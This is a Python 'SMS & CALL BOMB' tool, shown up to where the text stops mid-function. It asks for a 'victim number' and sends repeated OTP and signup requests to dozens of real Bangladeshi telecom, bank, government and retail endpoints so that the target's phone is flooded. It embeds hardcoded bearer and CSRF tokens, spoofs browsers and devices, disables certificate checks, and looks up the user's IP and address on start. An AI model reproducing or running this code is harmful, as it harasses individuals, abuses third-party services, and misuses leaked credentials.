#!/usr/bin/env python3
# CODE UPDATED FOR: SAMIR CHOWDHURY
# ORIGINAL BASE BY BARSHA

import os,sys,time,random,string,json,urllib3,base64,datetime
import logging,platform,importlib,hashlib
import requests
os.system("clear")
from requests.structures import CaseInsensitiveDict
from rich.progress import track
from rich.align import Align
from rich.panel import Panel
from rich.console import Console
console = Console()
# ---------------- Name -----------------
sys.stdout.write(f'\x1b[1;35m\x1b]2;(💣)==[SMS & CALL BOMB - SAMIR CHOWDHURY]==(💣)\x07')
#----------[ ASSEST ]----------#

def Lxj(BDCYBER):
    for x in BDCYBER:
        sys.stdout.write(x);sys.stdout.flush();time.sleep(0.003)
        
def LijA(BDCYBER):
    for x in BDCYBER:
        sys.stdout.write(x);sys.stdout.flush();time.sleep(0.001)
        
def BDCYBER(message):
    for i in track(range(40), description=f"{message}"):time.sleep(0.01)

a="\033[1;30m";r="\033[1;31m";g="\033[1;32m"
y="\033[1;33m";b="\033[1;34m";p="\033[1;35m"
c="\033[1;36m";w="\033[1;37m";bgr="\033[41m"
stp="\033[1;0m";itl="\033[1;3m";unl="\033[1;4m"
lgt="\033[1;1m"
A="[bold red]"
B="[bold cyan]"
C="[bold yellow]"
D="[bold color(78)]"
lmnXuserAgent1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
lmnXuserAgent2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
lmnXuserAgent3 = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
lmnXuserAgent4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
lmnXuserAgent5 = "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36"
lmnXuserAgent6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
lmnXuserAgent7 = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
lmnXuserAgent8 = "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
lmnXuserAgent9 = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36'
lmnXuserAgent10 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)'
lmnXuserAgent11 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1'

lmnXaccessVersion1 = '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'
lmnXaccessVersion2 = '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"'

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

RQS_ERR = fr"    [/]  REQUESTS ERROR"


#----------[ REMOTE LICENSE & TIME EXPIRY SYSTEM ]----------#
LICENSE_FILE = ".samir_license.json"

def check_license():
    os.system("clear")
    print_banner()
    print("\n")
    
    # আপনার GitHub বা অন্য কোনো সাইটে রাখা keys.json ফাইলের Raw লিঙ্ক এখানে দেবেন
    # যাতে কোডের ভেতরে আসল কি (Key) না থাকে।
    try:
        url = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/keys.json"
        response = requests.get(url, timeout=5)
        VALID_KEYS = response.json()
    except:
        console.print(Align.center("[bold red]❌ Internet Connection Error or Invalid Server Link!"))
        time.sleep(2)
        sys.exit(0)
    
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                data = json.load(f)
                expiry_str = data.get("expiry")
                expiry_date = datetime.datetime.fromisoformat(expiry_str)
                
                if datetime.datetime.now() < expiry_date:
                    remaining = expiry_date - datetime.datetime.now()
                    days_left = remaining.days
                    hours_left = remaining.seconds // 3600
                    console.print(Align.center(f"[bold green]✔ LICENSE ACTIVE! Remaining: {days_left} Days {hours_left} Hours"))
                    time.sleep(2)
                    return
        except:
            pass

    console.print(Align.center("[bold red]🔒 ACCESS LOCKED: ENTER VALID LICENSE KEY!"))
    print("\n")
    entered_key = input(f"  {c}[{w}/{c}] {g}Enter Your License Key {c}➤{r} ")
    
    if entered_key in VALID_KEYS:
        days = VALID_KEYS[entered_key]
        expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
        
        with open(LICENSE_FILE, "w") as f:
            json.dump({"expiry": expiry_date.isoformat()}, f)
            
        print(f"\n  {g}[✔] License Activated Successfully for {days} Day(s)!")
        time.sleep(2)
    else:
        print(f"\n  {r}[✘] Invalid License Key! Access Denied.")
        time.sleep(2)
        sys.exit(0)


#----------[ SECURITY ]---------#

try:
    ipv = requests.get("https://ident.me/json-api").json()
    ip = ipv["ip"]
    info = requests.get("https://ipinfo.io/widget/demo/"+ip).json()
    address = info["data"]["abuse"]["address"]
except:
    ip = None
    address = None


#----------[ LOGO ]----------#

BANNERS = [fr"""{A}
███████╗██╗  ██╗    ████████╗███████╗ █████╗ ███╗   ███╗
██╔════╝██║  ██║    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
█████╗  ███████║       ██║   █████╗  ███████║██╔████╔██║
██╔══╝  ██╔══██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
███████╗██║  ██║       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝  ╚═╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
                                                        

"""]

def choose_banner():
    return BANNERS[0]

def print_banner():
    banner = choose_banner()
    print("\n"*2)
    console.print(Align.center(f"{banner}"))
    console.print(
        Align.center(
            Panel.fit(
                "[bold cyan] SAMIR CHOWDHURY 👿",
                border_style="bold green"
            )
        )
    )

def lnx():
    print("\n")
    console.rule("")
    print("\n")
def war():
   console.print(Align.center("  [bold white][[bold yellow]WARNING[bold white]][bold red]  1 Round [bold white]= [bold green]82 SPAM"))
   print("\n")
def BCS():
    os.system("clear")
    print_banner()
    print("\n"*2)
    number=input(f"\n  {c}[{w}/{c}] {g}VICTIM NUMBER {c}➤{r} +88 ")
    lnx()
    if not number.isdigit() or len(number) != 11:
        Lxj(f"{c}[{w}/{c}] {y}Invalid Number Try Again ! ")
        time.sleep(2);BCS()
    elif "BCS" in number:
        Lxj(f"{c}[{w}/{c}] {y}Invalid Number Try Again ! ")
        time.sleep(2);BCS()
    try:war();amo=int(input(f"  {c}[{w}/{c}] {g}SPAM Round AMOUNT {c}➤{r} "))
    except ValueError:
        lnx();Lxj(f" {c}[{w}/{c}] {y}Use Amount Only Number Digit ! ")
        time.sleep(2);BCS()
    DARKS(number,amo)


#----------[ NEW CUSTOM APIs (EYECON & ROCKET) ]-----------#
def lmnXlija_61(number):
    try:
        url = "https://api.eyecon-app.com/app/cli_auth/gettransport"
        cli_full = "88" + number
        params = {
            'cv': "vc_739_vn_4.2026.02.19.1555_a",
            'cli': cli_full,
            'reg_id': "",
            'is_already_social_auth': "false",
            'installer_name': "manually or unknown source",
            'n_sims': "1",
            'time': str(int(time.time() * 1000)),
            'is_sms_sending_available': "true",
            'is_whatsapp_installed': "false",
            'mc': "3D:6E:2C:AD:DD:92",
            'device_id': "338fdcde4f9cb045",
            'time_zone': "Asia/Dhaka",
            'device_manu': "Google",
            'device_model': "Pixel 4"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36",
            "Connection": "Keep-Alive",
            "accept-charset": "UTF-8",
            "content-type": "application/x-www-form-urlencoded; charset=utf-8"
        }
        requests.get(url, params=params, headers=headers, timeout=15, verify=False)
    except: pass

def lmnXlija_62(number):
    try:
        url = "https://services.dutchbanglabank.com/rocket-app-api"
        headers = {"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}
        data = {"phone": number, "steps": "login"}
        requests.post(url, json=data, headers=headers, timeout=10, verify=False)
    except: pass


#----------[ WEB HTML ADDED APIs (63 to 82) ]-----------#

def lmnXlija_63(number):
    try: requests.get(f"https://mediking.com.bd/otp_login?phone={number}", verify=False)
    except: pass

def lmnXlija_64(number):
    try: requests.get(f"https://akboria.com/varify/otp?phone={number}", verify=False)
    except: pass

def lmnXlija_65(number):
    try: requests.get(f"https://yusha.com.bd/varify/otp?phone={number}", verify=False)
    except: pass

def lmnXlija_66(number):
    try: requests.get(f"https://urbalandbd.com/varify/otp?phone={number}", verify=False)
    except: pass

def lmnXlija_67(number):
    try: requests.get(f"https://godxg.com/varify/otp?phone={number}", verify=False)
    except: pass

def lmnXlija_68(number):
    try: requests.get(f"https://nogori.com/varify/otp?phone={number}", verify=False)
    except: pass

def lmnXlija_69(number):
    try:
        url = "https://ecom.rangs.com.bd/send-otp-code"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}
        data = {'mobile': '+88' + number, 'type': 1, 'hash': '1c749e89265090bab485ae10cee6f8bfe5beff0834cd75f58a985dc47a844d3c'}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_70(number):
    try:
        url = "https://bd.1xbet.com/web-api/api/web/registration/v2/sms"
        headers = {'Accept': 'application/vnd.api+json', 'User-Agent': lmnXuserAgent1}
        data = {'data': {'attributes': {'phone': number[1:] if number.startswith('0') else number, 'country_code': '880'}}}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_71(number):
    try:
        url = "https://www.pickaboo.com/rest/default/V1/customer-check/exist"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}
        data = {'mobile': number}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_72(number):
    try:
        url = "https://api.10minuteschool.com/auth/v1/userExists"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}
        data = {'username': '+88' + number, 'loginType': 'phone', 'g_recaptcha_response': '...'}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_73(number):
    try:
        url = "https://api.ostad.app/api/v2/user/with-otp"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}
        data = {'msisdn': number}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_74(number):
    try:
        url = "https://api.togumogu.com/api/auth/verification-code"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}
        data = {'mobile': number, 'sendTo': 'mobile'}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_75(number):
    try:
        url = "https://api.apex4u.com/api/auth/login"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}
        data = {'phoneNumber': number}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_76(number):
    try:
        url = "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent5}
        data = {'phone': number, 'email': '', 'language': 'en'}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_77(number):
    try:
        url = "https://citizen.scc.gov.bd/api/v1/citizen/auth/register/start"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}
        data = {'mobile': number}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_78(number):
    try:
        url = "https://partners.bpodms.gov.bd/partner-registration/otp/request"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}
        data = {'mobile': number}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_79(number):
    try: requests.get(f"https://authiis.icab.org.bd/api/otp/lookup?username={number}&userType=MEMBER", verify=False)
    except: pass

def lmnXlija_80(number):
    try:
        url = "https://baji999.in/api/wv/v1/user/registerPreCheck"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}
        data = {'languageTypeId': 1, 'currencyTypeId': 8, 'userId': 'sa5422', 'phone': number, 'friendReferrerCode': '', 'captcha': '', 'callingCode': '880', 'registerTypeId': 0, 'random': ''}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_81(number):
    try:
        url = "https://api.mcquest.com.bd/api/auth/v1/register/otp-request"
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}
        data = {'mobile': number}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_82(number):
    try: requests.get("https://wenp.bangladeshtradeportal.gov.bd/otp-check", verify=False)
    except: pass


#----------[ APIs 1 to 60 ]-----------#

def lmnXlija_1(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'device_identifier': 'undefined',
            'device_name': 'undefined',
            'origin': 'https://go.paperfly.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://go.paperfly.com.bd/',
            'sec-ch-ua': lmnXaccessVersion1,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent2,
        }
        json_data = {
            'full_name': 'Johny Singh',
            'company_name': 'lmnxlija',
            'email_address': 'lmnxlija9689@gmail.com',
            'phone_number': number,
        }
        requests.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_2(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://ghoorilearning.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://ghoorilearning.com/',
            'sec-ch-ua': lmnXaccessVersion1,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent2,
        }
        params = {'_app_platform': 'web'}
        json_data = {'mobile_no': number}
        requests.post('https://api.ghoorilearning.com/api/auth/signup/otp', params=params, headers=headers, json=json_data)
    except: pass
        
def lmnXlija_3(number):
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://doctime.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://doctime.com.bd/',
            'sec-ch-ua': lmnXaccessVersion1,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': lmnXuserAgent2,
        }
        json_data = {'data': {'country_calling_code': '88', 'contact_no': number, 'headers': {'PlatForm': 'Web'}}}
        requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_4(number):
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': '',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://customer.sundarbancourierltd.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://customer.sundarbancourierltd.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {'operationName': 'CreateAccessToken', 'variables': {'accessTokenFilter': {'userName': number}}, 'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n        message\n        statusCode\n        result {\n      phone\n      otpCounter\n      __typename\n        }\n        __typename\n  }\n}'}
        requests.post('https://api-gateway.sundarbancourierltd.com/graphql', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_5(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://apex4u.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://apex4u.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {'phoneNumber': number}
        requests.post('https://api.apex4u.com/api/auth/login', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_6(number):
    try:
        url = "https://webapi.robi.com.bd/v1/send-otp"
        headers = {
            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc",
            "Content-Type": "application/json",
        }
        data = {"phone_number": number, "type": "doorstep"}
        requests.post(url, json=data, headers=headers)
    except: pass
        
def lmnXlija_7(number):
    try:
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Origin': 'https://banglalink.net',
            'Pragma': 'no-cache',
            'Referer': 'https://banglalink.net/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        requests.get('https://web-api.banglalink.net/api/v1/user/number/validation/'+number, headers=headers)
    except: pass
        
def lmnXlija_8(number):
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://banglalink.net',
            'Pragma': 'no-cache',
            'Referer': 'https://banglalink.net/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'client-security-token': '1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json_data = {'mobile': number}
        requests.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_9(number):
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.grameenphone.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.grameenphone.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        data = {'msisdn': number}
        requests.post('https://webloginda.grameenphone.com/backend/api/v1/otp', headers=headers, data=data)
    except: pass
        
def lmnXlija_10(number):
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.robi.com.bd',
            'Pragma': 'no-cache',
            'Referer': 'https://www.robi.com.bd/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json_data = {'phone_number': number, 'type': 'my_offer'}
        requests.post('https://webapi.robi.com.bd/v1/send-otp', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_11(number):
    try:
        url = "https://da-api.robi.com.bd/da-nll/otp/send"
        data = {"msisdn": number}
        headers = {"Content-Type": "application/json"}
        requests.post(url, json=data, headers=headers)
    except: pass
        
def lmnXlija_12(number):
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.robi.com.bd',
            'Pragma': 'no-cache',
            'Referer': 'https://www.robi.com.bd/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json_data = {'phone_number': number, 'name': 'Johny Singh', 'type': 'video-chat'}
        requests.post('https://webapi.robi.com.bd/v1/chat/send-otp', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_13(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://redx.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://redx.com.bd/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {'phoneNumber': number}
        requests.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_14(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://fundesh.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://fundesh.com.bd/fundesh/profile',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': lmnXuserAgent1,
        }
        params = {'service_key': ''}
        json_data = {'msisdn': number}
        requests.post('https://fundesh.com.bd/api/auth/generateOTP', params=params, headers=headers, json=json_data)
    except: pass
        
def lmnXlija_15(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en',
            'application-name': 'web',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://bikroy.com/?login-modal=true&redirect-url=/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': lmnXuserAgent1,
        }
        params = {'phone': number}
        requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', params=params, headers=headers)
    except: pass
        
def lmnXlija_16(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://motionview.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://motionview.com.bd/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {'phone': number}
        requests.post('https://api.motionview.com.bd/api/send-otp-phone-signup', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_17(number):
    try:
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': '',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.chorki.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.chorki.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        params = {'country': 'BD', 'platform': 'web', 'language': 'en'}
        json_data = {'number': '+88'+number}
        requests.post('https://api-dynamic.chorki.com/v2/auth/login', params=params, headers=headers, json=json_data)
    except: pass
        
def lmnXlija_18(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://rental.jatri.co',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://rental.jatri.co/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {'phone': '+88'+number, 'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'}
        requests.post('https://user-api.jslglobal.co:444/v2/send-otp', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_19(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://chinaonlinebd.com/login?next=/dashboard',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'token': '45601f3d391886fcec5f5a3f26780f21',
            'user-agent': lmnXuserAgent1,
        }
        params = {'phone': number}
        requests.get('https://chinaonlinebd.com/api/login/getOtp', params=params, headers=headers)
    except: pass
        
def lmnXlija_20(number):
    try:
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': '',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.deeptoplay.com',
            'pragma': 'no-cache',
